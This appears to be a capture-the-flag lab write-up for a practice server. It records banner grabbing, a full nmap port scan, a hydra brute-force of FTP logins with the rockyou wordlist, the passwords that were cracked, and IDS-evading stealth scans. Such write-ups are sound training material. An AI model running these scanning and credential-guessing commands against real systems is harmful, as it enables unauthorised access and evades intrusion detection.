There is a hidden flag on the SSH server header > ` telnet HOST 22`
And one in the HTTP server header > `telnet HOST 80` > `GET / HTTP/1.1` > `host: telnet`

Full port scan using nmap > `nmap -p- -T5 -sS -n HOST`  shows a hidden service on 10021 and 28182 
Interrogate ports to find the open FTP service > `nmap -A -p 10021 HOST` version is vsftpd 3.0.3
Attempt accessing FTP > `ftp HOST 10021` we need a login
Provided 2 usernames, use hydra to credential stuff passwords > `hydra -l eddie -P /usr/share/wordlists/rockyou.txt -s 10021 HOST ftp'`
Hydra returns: `login: eddie  password: jordan` and for "quinn" returns `login: quinn  password: andrea`
Login to FTP > `ftp HOST 10021` > username and pass entry and > `ls` to find files
eddie's FTP is empty, but quinn's has 1 file
Use `get ftp_flag.txt` to copy the file back to the home directory

A webpage is hosted that reports on IDS' ability to detect a scan, attempted a "covert" scan with `nmap -sS -f -F 10.10.125.36'` which was too loud, so changed to an`-sN` scan which was quieter and provided a flag
